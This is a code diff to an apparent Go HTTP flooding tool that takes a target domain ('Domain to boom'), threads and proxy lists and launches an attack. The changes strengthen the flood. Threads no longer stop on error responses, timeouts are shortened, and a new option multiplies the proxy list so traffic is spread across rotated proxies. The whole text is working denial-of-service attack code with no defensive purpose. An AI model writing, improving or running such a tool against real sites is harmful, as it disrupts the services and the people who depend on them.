@@ -18,20 +18,20 @@ import (
 )
 
 var statusCodeToEscape = []string{
-	"503 Too many open connections",
-	"401 Unauthorized",
-	"409 Conflict",
-	"404 Not Found",
-	"502 Bad Gateway",
-	"504 Gateway Timeout",
-	"407 Proxy Authentication Required",
-	"400 Bad Request",
-	"502 Proxy Error",
-	"403 Forbidden",
-	"503 Service Unavailable",
-	"504 DNS Name Not Found",
-	"407 Unauthorized",
-	"405 Method Not Allowed",
+	// "503 Too many open connections",
+	// "401 Unauthorized",
+	// "409 Conflict",
+	// "404 Not Found",
+	// "502 Bad Gateway",
+	// "504 Gateway Timeout",
+	// "407 Proxy Authentication Required",
+	// "400 Bad Request",
+	// "502 Proxy Error",
+	// "403 Forbidden",
+	// "503 Service Unavailable",
+	// "504 DNS Name Not Found",
+	// "407 Unauthorized",
+	// "405 Method Not Allowed",
 }
 
 func getProxyList_github(link string) []string {
@@ -165,7 +165,7 @@ func handlerProxy(domain, proxy string) string {
 		}}
 	//set http client like a mozilla browser
 	//client timeout after 1 second
-	client.Timeout = time.Second * 5
+	client.Timeout = time.Millisecond * 1000
 	//connect to the website
 	resp, err := client.Get("http://" + domain)
 	if err != nil {
@@ -191,7 +191,7 @@ func handler(domain string) string {
 	//create a new http client
 	client := &http.Client{}
 	//set http client like a mozilla browser
-	client.Timeout = time.Second * 5
+	client.Timeout = time.Millisecond * 100
 	//connect to the website
 	resp, err := client.Get("http://" + domain)
 	if err != nil {
@@ -294,6 +294,7 @@ func main() {
 	domain := parser.String("d", "domain", &argparse.Options{Required: true, Help: "Domain to boom"})
 	threads := parser.String("t", "threads", &argparse.Options{Required: false, Help: "Number of threads", Default: "max"})
 	proxy_file := parser.StringList("p", "proxy-file", &argparse.Options{Required: false, Help: "Proxy file(s), separate with a ',' each files. Format of file(s) must be ip:port", Default: []string{}})
+	proxy_mult := parser.Int("x", "proxy-mult", &argparse.Options{Required: false, Help: "You can multiply the working proxys detected with this option", Default: "12"})
 	mode := parser.Int("m", "mode", &argparse.Options{Required: false, Help: "Mode of attack, 1 for pass all traffic trough proxy, 2 don't use proxy", Default: 1})
 	err := parser.Parse(os.Args)
 	if err != nil {
@@ -315,13 +316,18 @@ func main() {
 			}
 		}
 		proxy_list := test_proxy(*proxy_file)
+		var proxy_list_temp []string
 		fmt.Println("Good proxy : ", len(proxy_list))
-		for i := 0; i < 5; i++ {
-			proxy_list = append(proxy_list, proxy_list...)
+		for i := 0; i < *proxy_mult; i++ {
+			proxy_list_temp = append(proxy_list_temp, proxy_list...)
+			//if last
+			if i == *proxy_mult-1 {
+				proxy_list = proxy_list_temp
+			}
 		}
 
 		//get the list of proxy
-		fmt.Println("Total proxy :", len(proxy_list))
+		fmt.Println("Total proxy after multiplication :", len(proxy_list))
 		fmt.Println("Starting attack in 5 seconds...")
 		time.Sleep(5 * time.Second)
 		threads_int := 10
@@ -357,12 +363,12 @@ func main() {
 								fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
 								continue
 							} else {
-								break
+								continue
 							}
 
 						}
-						fmt.Println("Thread died")
-						return
+						//fmt.Println("Thread died")
+						//return
 					}
 				}(chunk)
 			}
@@ -388,7 +394,7 @@ func main() {
 							fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
 							continue
 						} else {
-							break
+							continue
 						}
 					}
 				}()
